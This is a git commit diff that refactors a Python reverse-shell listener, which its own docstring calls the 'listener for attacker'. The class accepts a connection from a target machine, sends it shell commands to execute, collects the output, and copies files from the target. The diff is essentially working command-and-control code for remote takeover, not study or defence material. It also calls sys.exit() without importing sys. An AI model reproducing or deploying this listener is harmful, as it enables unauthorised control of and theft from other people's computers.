06ef045d7a28fb3e6745b89759f5c4ce8b7940af
Anon4Now <tutkoda@gmail.com>
2022-09-25 09:59:12 -0400

    refactored a couple methods and added some doc strings

--- listener/listener.py
+++ listener/listener.py
@@ -1,31 +1,47 @@
-#!/usr/env/bin python
+"""Module containing the class that will manage the listener for attacker"""
 
-import socket, json, base64
+# Standard Library imports
+import socket
+import json
+import base64
 
 
 class Listener:
 
-    # Constructor method
-    def __init__(self, localIP, localPort):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def __init__(self, local_ip: str, local_port: int, listener: socket.socket) -> None:
+        """
+        Initializer that takes in the target machines IP, the port to listen to connections from
+        and an instantiated listener object from the socket package.
+
+        :param local_ip: (required) Local IP of target machine (e.g., "192.168.229.130")
+        :param local_port: (required) Port for listener to monitor for connections (e.g., 4444)
+        :param listener: (required) Instantiated listener object from socket package
+        """
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                             1)  # enable option to reuse sockets in case connection drops to reconnect
-        listener.bind((localIP, localPort))  # expects a tuple () | create listener on local host
+        listener.bind((local_ip, local_port))  # expects a tuple () | create listener on local host
         listener.listen(0)  # how many backlogged connections can this server listener handle
+
         print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
         print("[+] Got a connection " + str(address))
 
     # Serialize as JSON and send
-    def reliableSend(self, data):
-        jsonData = json.dumps(data)
-        # self.connection.send(jsonData)  # py2
-        self.connection.send(jsonData.encode())  # py3
+    def serialize_as_json_and_send(self, data: str) -> None:
+        """
+        Method that takes in a command as a string and converts it to
+        a JSON string that will be sent via the socket to the target machine
+        to execute locally. The JSON is then encoded to utf-8 byte string for
+        ability to upload/download images, files, etc...
+
+        :param data: String command (e.g., 'dir', 'ls', 'cwd', etc...)
+        :return: None
+        """
+        self.connection.send(json.dumps(data).encode())
 
     # Deserialize data and return
-    def reliableReceive(self):
-        # jsonData = ""  # create an empty string | py2
-        jsonData = b""  # create an empty byte string | py3
+    def deserialize_and_return(self):
+        jsonData = b""  # create an empty byte string
         while True:  # create infinite loop to collect all data from the TCP stream in the pipe
             try:  # check to see if all data has been collected and JSON deserialization can occur
                 jsonData = jsonData + self.connection.recv(
@@ -36,11 +52,11 @@ class Listener:
 
     # Execute commands on remote machine
     def executeRemotely(self, command):
-        self.reliableSend(command)  # send command to target host
+        self.serialize_as_json_and_send(command)  # send command to target host
         if command[0] == "exit":
             self.connection.close()
             sys.exit()
-        return self.reliableReceive()  # get result from target host
+        return self.deserialize_and_return()  # get result from target host
 
     # Create copy file from target host
     @staticmethod
@@ -56,8 +72,7 @@ class Listener:
     # Start up the listener
     def startListener(self):
         while True:
-            # command = raw_input(">> ")  # py2 user input
-            command = input(">> ")  # py3 user input
+            command = input(">> ")
             command = command.split(" ")  # split string into list by spaces
 
             try:  # keep socket connection alive and check to see if there was an error
